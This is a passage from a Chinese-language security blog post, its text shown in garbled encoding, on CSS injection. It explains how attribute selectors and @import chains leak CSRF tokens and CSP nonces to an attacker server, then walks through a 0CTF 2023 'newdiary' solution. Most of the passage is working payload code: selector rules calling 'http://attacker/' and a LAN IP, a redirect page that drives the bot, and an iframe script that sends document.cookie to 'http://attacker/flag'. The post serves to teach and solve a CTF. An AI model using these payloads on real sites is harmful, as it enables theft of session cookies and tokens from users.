    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"c"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>å¾—åˆ°ç¬¬ä¸€ä¸ªå­—ç¬¦åï¼ˆå‡è®¾ä¸º aï¼‰ï¼Œå°±å¯ä»¥å¼€å§‹éå†ç¬¬äºŒä¸ªå­—ç¬¦ã€‚</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"aa"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ab"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ac"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>åˆ©ç”¨è¿™æ ·ä¾§ä¿¡é“çš„æ–¹å¼ï¼Œå¾ªç¯éå†å°±å¯ä»¥è·å–åˆ°æ‰€æœ‰çš„ csrf-tokenã€‚</p>

<p>ä½†å…¶ä¸­å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœè¦ä¸€æ¬¡å°†æ‰€æœ‰ payload æ³¨å…¥è¿›å»ï¼Œå¤§å°å†™å­—æ¯åŠæ•°å­—åŠ èµ·æ¥ 62 ä¸ªï¼Œå¦‚æœè¦éå†æ¯ç§ç»„åˆçš„è¯ payload å°†ä¼šéå¸¸é•¿ï¼Œç‰¹åˆ«æ˜¯ token é•¿åº¦ä¸€èˆ¬ä¹Ÿä¸ä¼šçŸ­ã€‚</p>

<p>å¦‚æœåˆ†æ®µæ³¨å…¥å‘¢ï¼Ÿä¾‹å¦‚å…ˆæ³¨å…¥çŒœè§£ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ payloadï¼Œç¡®è®¤ç¬¬ä¸€ä¸ªå­—ç¬¦ä¹‹åï¼Œå†æ³¨å…¥çŒœè§£ç¬¬äºŒä¸ªå­—ç¬¦çš„ payloadã€‚ä½†è¿™åˆä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œé¡µé¢éœ€è¦è¿›è¡Œåˆ·æ–°æ‰èƒ½åŠ è½½æ–°çš„ payloadï¼Œè€Œåˆ·æ–°ä¹‹åï¼Œcsrf-token å¾€å¾€ä¼šå‘ç”Ÿå˜åŒ–ã€‚</p>

<p>Pepe Vila åœ¨ 2019 æå‡ºäº†æ–°çš„åˆ©ç”¨æ–¹å¼ï¼š@importï¼Œå¯ä»¥åœ¨ä¸åˆ·æ–°é¡µé¢çš„æƒ…å†µä¸‹ï¼Œåˆ†é˜¶æ®µåŠ è½½ cssã€‚</p>

<p>@import å¯ä»¥è¿›ä¸€æ­¥åŠ è½½å…¶ä»–çš„ cssã€‚ç¤ºä¾‹ payload å¦‚ä¸‹ï¼š</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">@import</span> <span class="sx">url(https://myserver.com/start?len=8)</span>
</code></pre></div></div>
<p>æ”»å‡»è€…æœåŠ¡å™¨å¯ä»¥å›å¤ä¸‹é¢çš„ payloadï¼Œæ­¤æ—¶å®¢æˆ·ç«¯ä¼šé€ä¸ªè¯·æ±‚ã€‚</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">@import</span> <span class="sx">url(https://myserver.com/payload?len=1)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=2)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=3)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=4)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=5)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=6)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=7)</span>
<span class="err">@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=8)</span>
</code></pre></div></div>
<p>å®¢æˆ·ç«¯è¯·æ±‚ payload?len=1 æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥å›å¤æšä¸¾ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ payloadã€‚</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"a"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"b"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"c"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>ç¬¬ä¸€ä¸ªå­—ç¬¦ç¡®è®¤åï¼Œå†ç”Ÿæˆ payload?len=2 çš„å“åº”å†…å®¹ï¼Œå®¢æˆ·ç«¯æ­¤æ—¶è¯·æ±‚è¯¥ url æ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥å›å¤ç‰¹å®šçš„ payloadã€‚</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"aa"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=a")</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ab"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=b")</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="nt">form</span><span class="nd">:has</span><span class="o">(</span><span class="nt">input</span><span class="o">[</span><span class="nt">name</span><span class="o">=</span><span class="s1">"csrf-token"</span><span class="o">][</span><span class="nt">value</span><span class="o">^=</span><span class="s1">"ac"</span><span class="o">])</span><span class="p">{</span>
        <span class="nl">background</span><span class="p">:</span> <span class="sx">url("http://attacker/?q=c")</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="o">...</span>
</code></pre></div></div>
<p>åé¢çš„è¿‡ç¨‹ä¾æ¬¡ç±»æ¨ã€‚</p>

<p>è¿™ç§æ–¹å¼ä¹Ÿæœ‰ä¸€äº›éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š</p>
<ol>
  <li>æµè§ˆå™¨å¯¹åŒä¸€ä¸ªåŸŸåå‘èµ·çš„è¯·æ±‚æœ‰ä¸Šé™ã€‚å¦‚æœè¯·æ±‚å¤ªå¤šä»æ—§ä¼šè¢«é™åˆ¶ï¼Œä½†ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®å¤šä¸ªå­åŸŸåæ¥ç»•è¿‡é™åˆ¶ï¼Œæ¯”å¦‚ a.attacker.comï¼Œb.attacker.comã€‚</li>
  <li>firefox ä¸‹ payload æœ‰æ‰€ä¸åŒï¼ŒåŸå› åœ¨äº firefox ä¸ä¼šé€ä¸ª import cssï¼Œè€Œæ˜¯ä¸€æ¬¡æ€§åŠ è½½ï¼Œè¿™æ ·å°±è¾¾ä¸åˆ°åˆ†é˜¶æ®µç¡®è®¤å­—ç¬¦çš„ç›®çš„ã€‚ MichaÅ‚ Bentkowski çš„æ–‡ç« æå‡ºäº†è§£å†³åŠæ³•ï¼š<a href="https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/">CSS data exfiltration in Firefox via a single injection point - research.securitum.com</a></li>
</ol>

<p>chrome å’Œ firefox é€šç”¨ payloadï¼š</p>
<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nt">style</span><span class="o">&gt;</span><span class="k">@import</span> <span class="sx">url(https://myserver.com/payload?len=1)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=2)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=3)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=4)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=5)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=6)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=7)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
<span class="err">&lt;</span><span class="n">style</span><span class="err">&gt;@</span><span class="n">import</span> <span class="sx">url(https://myserver.com/payload?len=8)</span><span class="err">&lt;</span><span class="p">/</span><span class="n">style</span><span class="err">&gt;</span>
</code></pre></div></div>

<h2 id="æ›´å¿«çš„æšä¸¾">æ›´å¿«çš„æšä¸¾</h2>
<p>æ–‡ç«  <a href="https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/">Code Vulnerabilities Put Proton Mails at Risk - Sonar</a> å±•ç¤ºäº†ä¸€ç§æ›´å¿«çš„æšä¸¾æ–¹å¼ã€‚</p>

<p>é€šè¿‡ç¤ºä¾‹ä»£ç å¯ä»¥æ›´å¥½åœ°ç†è§£ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;</span>
    &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Security-Policy"</span>
      <span class="nv">content</span><span class="o">=</span><span class="s2">"script-src 'nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline'"</span><span class="o">&gt;</span>
  &lt;/head&gt;
  &lt;style&gt;
    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aaa"</span><span class="o">]){</span><span class="nt">--tosend-aaa</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aaa<span class="o">)</span><span class="p">;</span><span class="o">}</span>
    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aab"</span><span class="o">]){</span><span class="nt">--tosend-aab</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aab<span class="o">)</span><span class="p">;</span><span class="o">}</span>
    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aac"</span><span class="o">]){</span><span class="nt">--tosend-aac</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aac<span class="o">)</span><span class="p">;</span><span class="o">}</span>

    input<span class="o">{</span>
        background: var<span class="o">(</span><span class="nt">--tosend-aaa</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aab</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aac</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aad</span>, none<span class="o">)</span>
    <span class="o">}</span>

  &lt;/style&gt;
  &lt;body&gt;
    &lt;input&gt;
    &lt;script <span class="nv">nonce</span><span class="o">=</span><span class="s2">"nonce-aaaqhkkzvf5mc3iv090nyysyq6wc80ai4v1"</span><span class="o">&gt;</span>
        console.log<span class="o">(</span>1<span class="o">)</span>
    &lt;/script&gt;
  &lt;/body&gt;
</code></pre></div></div>
<p>é¡µé¢ä¸­çš„ CSP è®¾ç½®äº† nonce å€¼ï¼Œåªæœ‰ nonce å±æ€§å€¼ä¸ CSP ä¸­è®¾ç½®çš„å€¼ç›¸åŒçš„ JS å†…é“¾è„šæœ¬æ‰èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œè¿™ä¸ªæœºåˆ¶é€šå¸¸ç”¨äº XSS é˜²æŠ¤ã€‚æ”»å‡»è€…éœ€è¦çªƒå–åˆ°è¯¥å€¼æ‰èƒ½å¤Ÿæ­£å¸¸è¿è¡Œ XSSã€‚</p>

<p>å…¶ä¸­ css æ³¨å…¥ payload å¦‚ä¸‹ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    :has<span class="o">(</span>script[nonce<span class="k">*</span><span class="o">=</span><span class="s2">"aaa"</span><span class="o">]){</span><span class="nt">--tosend-aaa</span>: url<span class="o">(</span>http://192.168.137.98:7777?x<span class="o">=</span>aaa<span class="o">)</span><span class="p">;</span><span class="o">}</span>

    input<span class="o">{</span>
        background: var<span class="o">(</span><span class="nt">--tosend-aaa</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aab</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aac</span>, none<span class="o">)</span>,
        var<span class="o">(</span><span class="nt">--tosend-aad</span>, none<span class="o">)</span>
    <span class="o">}</span>
</code></pre></div></div>
<p>å…¶ä½œç”¨å°±æ˜¯åœ¨é¡µé¢é€‰æ‹© nonce å€¼åŒ…å«äº† aaa çš„ script æ ‡ç­¾ï¼ˆ<code class="language-plaintext highlighter-rouge">*=</code> è¡¨ç¤º nonce å€¼å«æœ‰ aaa æ—¶ï¼‰ï¼Œå¦‚æœèƒ½å¤Ÿé€‰æ‹©åˆ°ï¼Œåˆ™è®¾å®šä¸€ä¸ªè‡ªå®šä¹‰å±æ€§ tosend-aaaï¼ˆè‡ªå®šä¹‰å±æ€§ä»¥ â€“ å¼€å¤´ï¼‰ï¼Œé€šè¿‡è¿™ä¸ªå±æ€§å‘å¤–å‘èµ·è¯·æ±‚ã€‚</p>

<p>å®šä¹‰ input æ ·å¼çš„ä½œç”¨åœ¨äºè°ƒç”¨è‡ªå®šä¹‰å‚æ•°ï¼Œä»è€Œè§¦å‘å‘å¤–çš„è¯·æ±‚ï¼Œæ¢ç”¨å…¶ä»–æ ‡ç­¾ä¹ŸåŒæ ·å¯ä»¥ï¼Œä¾‹å¦‚ divã€‚</p>

<p>ç”±äº nonce ä¸­å­˜åœ¨ aaaï¼Œå› æ­¤å¯ä»¥å—åˆ°ä¸€ä¸ª aaa çš„è¯·æ±‚ï¼š</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212195241.png" alt="20231212195241" /></p>

<p>å¦‚ä½•è·å–å®Œæ•´çš„å­—ç¬¦ä¸²å‘¢ï¼Ÿå‡è®¾ none å€¼ä¸º 32 ä½éšæœºå­—ç¬¦ä¸²ï¼š
qhkkzvf5mc3iv090nyysyq6wc80ai4v1</p>

<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šé¢çš„æ–¹å¼ï¼Œæ¯æ¬¡è·å– 3 ä½çš„å­ä¸²ï¼Œè·å–åˆ° 30 ä¸ªä¸é‡å¤çš„å­ä¸²ï¼Œé€šè¿‡å›æº¯çš„æ–¹å¼å³å¯æ¢å¤æ•´ä¸ªå­—ç¬¦ä¸²ã€‚æ¯”å¦‚ f5m çš„åä¸¤ä½ä¸º 5m, 5m åˆæ˜¯ 5mc çš„å¼€å¤´ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç¡®è®¤ f5m åä¸€ä¸ªå­—ç¬¦ä¸º cã€‚</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="sh">'</span><span class="s">f5m</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">c3i</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">i4v</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">3iv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">zvf</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">iv0</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">syq</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">0ai</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">6wc</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">kkz</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">yq6</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">q6w</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">5mc</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">c80</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">4v1</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ysy</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">0ny</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">yys</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">ai4</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">090</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">v09</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">nyy</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">mc3</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">hkk</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">qhk</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">vf5</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">kzv</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">wc8</span><span class="sh">'</span><span class="p">}</span>
</code></pre></div></div>
<p>è¿™æ ·ä¸€æ¥ï¼Œåªéœ€è¦è¾ƒå°‘çš„è¯·æ±‚å°±å¯ä»¥è·å–å®Œæ•´çš„å­—ç¬¦ä¸²ã€‚</p>

<h2 id="0ctf-2023-newdiary">0CTF 2023 newdiary</h2>
<p>å‰å‡ å¤©çš„ 0CTF 2023 newdiary è¿™é“é¢˜å°±æ˜¯è€ƒå¯Ÿçš„ CSS æ³¨å…¥çš„åˆ©ç”¨ã€‚</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231212200326.png" alt="20231212200326" /></p>

<p>é¢˜ç›®è®¾å®šäº†ä¸€ä¸ª XSS çš„åœºæ™¯ï¼Œç”¨æˆ·å¯ä»¥å‘å¸ƒå†…å®¹å¹¶åˆ†äº«ç»™åå° botï¼Œbot çš„ cookie è®¾å®šä¸º FLAGï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡ XSS è·å–åˆ° FLAGã€‚</p>

<p>é¢˜ç›®æ²¡æœ‰è¿›è¡Œ XSS çš„è¿‡æ»¤ï¼Œä½†è®¾å®šäº† CSPï¼Œå³ä½¿èƒ½å¤Ÿæ’å…¥ js ä»£ç ï¼Œç”±äºæ— æ³•ç¡®è®¤ nonce å€¼ï¼Œä»£ç ä¹Ÿæ— æ³•æ‰§è¡Œã€‚</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Security-Policy"</span>
      <span class="na">content=</span><span class="s">"script-src 'nonce-qhkkzvf5mc3iv090nyysyq6wc80ai4v1'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com"</span><span class="nt">&gt;</span>
</code></pre></div></div>
<p>ä½† CSP style-src è®¾ç½®ä¸º â€˜unsafe-inlineâ€™ https://unpkg.comâ€ï¼Œå…è®¸å†…è”æ‰§è¡Œï¼Œå¹¶ä¿¡ä»»æ¥è‡ª unpkg.com çš„ cssï¼Œæ‰€ä»¥è¿™é“é¢˜çš„æ€è·¯å°±æ˜¯åˆ©ç”¨ css æ³¨å…¥æ¥çªƒå– nonce å€¼ã€‚</p>

<p>åˆ©ç”¨æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
  <li>æ–°å»ºä¸€ä¸ªç¬”è®° redirectï¼Œid ä¸º 0ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œè¯¥ payload å¯ä»¥è¾¾æˆé‡å®šå‘çš„æ•ˆæœã€‚åœ¨æ— æ³•ä½¿ç”¨ js æ—¶ï¼Œå¯ä»¥é€šè¿‡ mata æ¥å®Œæˆé‡å®šå‘ï¼Œmeta æ ‡ç­¾é€šå¸¸ä¸ä¼šè¢«è¿‡æ»¤ã€‚
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"refresh"</span> <span class="na">content=</span><span class="s">"0.0;url=http://192.168.137.98:8888/index.html"</span><span class="nt">&gt;</span> 
</code></pre></div>    </div>
    <p>å…¶ä¸­ index.html å†…å®¹å¦‚ä¸‹ï¼š</p>
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">&lt;!DOCTYPE html&gt;</span>
 <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;head&gt;</span>
     <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
     <span class="nt">&lt;title&gt;</span>Document<span class="nt">&lt;/title&gt;</span>
 <span class="nt">&lt;/head&gt;</span>
 <span class="nt">&lt;body&gt;</span>
        
     <span class="nt">&lt;script&gt;</span>
         <span class="kd">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">milliseconds</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">milliseconds</span><span class="p">));</span>
         <span class="k">async</span> <span class="kd">function</span> <span class="nf">run</span><span class="p">(){</span>
             <span class="nx">bot_window</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://localhost/share/read#id=1&amp;username=</span><span class="dl">"</span><span class="p">);</span> <span class="c1">// Exploit 1, leak nonce</span>
             <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">7000</span><span class="p">);</span>

             <span class="nx">bot_window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://localhost/share/read#id=2&amp;username=</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// Exploit 2, leak cookie</span>
             <span class="k">await</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
             <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">O</span><span class="dl">"</span><span class="p">);</span>
         <span class="p">}</span>
         <span class="nf">run</span><span class="p">();</span>
     <span class="nt">&lt;/script&gt;</span>
 <span class="nt">&lt;/body&gt;</span>
 <span class="nt">&lt;/html&gt;</span>
</code></pre></div>    </div>
    <p>å…¶ä¸»è¦åŠŸèƒ½æ˜¯è®© bot é€šè¿‡ window.open æ‰“å¼€æ–°çš„æ ‡ç­¾ï¼Œç„¶åè®¿é—® id=1 çš„ç¬”è®°ã€‚ç­‰å¾…ä¸€æ®µæ—¶é—´åï¼Œå†é‡å®šå‘åˆ° id=2 çš„ç¬”è®°ã€‚</p>
  </li>
  <li>æ–°å»ºä¸€ä¸ªç¬”è®° stealï¼Œid ä¸º 1,å†…å®¹ä¸ºçªƒå– nonce å€¼çš„ css è„šæœ¬ã€‚ç”±äºé¢˜ç›®ä¿¡ä»»æ¥è‡ª unpkg.com çš„ css æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå°†æ³„éœ² nonce å€¼çš„ css ä¸Šä¼ åˆ° unpkg.com ä¸­ã€‚
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"http://unpkg.com/xxx/leak.css"</span><span class="nt">&gt;&lt;input</span> <span class="nt">/&gt;</span>
</code></pre></div>    </div>
  </li>
  <li>å½“ bot è®¿é—® id=0 çš„ç¬”è®°æ—¶ï¼Œä¼šè¢«é‡å®šå‘åˆ°æ”»å‡»è€…é¡µé¢ï¼Œæ‰“å¼€æ–°çš„æ ‡ç­¾é¡µï¼Œè®¿é—® id=1 çš„ç¬”è®°ã€‚æ¥ç€åŠ è½½ leak.css æ³„æµå‡º id=1 é¡µé¢çš„ nonce å€¼ã€‚æ­¤æ—¶ bot è¿›å…¥ç­‰å¾…æ—¶é—´ã€‚</li>
  <li>æšä¸¾åˆ° nonce å€¼åï¼Œæ–°å»ºä¸€ä¸ªç¬”è®° flagï¼Œid ä¸º 2ï¼Œå†™å…¥è·å– cookie å€¼çš„ payloadï¼Œnonce å€¼ä¸ºåˆšæ‰çªƒå–åˆ°çš„å€¼
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;iframe <span class="nv">name</span><span class="o">=</span>asd <span class="nv">srcdoc</span><span class="o">=</span><span class="s2">"&lt;script nonce=xxxx &gt;top.location='http://attacker/flag?flag='+encodeURI(document['cookie'])&lt;/script&gt;"</span>/&gt;
</code></pre></div>    </div>
    <p>å› ä¸ºé¡µé¢è®¾ç½®äº† script-src ä¸º nonceï¼Œç¦æ­¢äº† js è„šæœ¬çš„å†…è”æ‰§è¡Œï¼Œå› æ­¤è¿™é‡Œä½¿ç”¨ iframe æ‰“å¼€å­çª—å£æ¥åŠ è½½ js ä»£ç ã€‚</p>
  </li>
  <li>bot ç»“æŸç­‰å¾…æ—¶é—´ï¼Œè®¿é—® id=2 çš„é¡µé¢ï¼Œæ‰§è¡Œ js ä»£ç å°† cookie å‘é€åˆ°è¿œç¨‹ã€‚</li>
</ol>

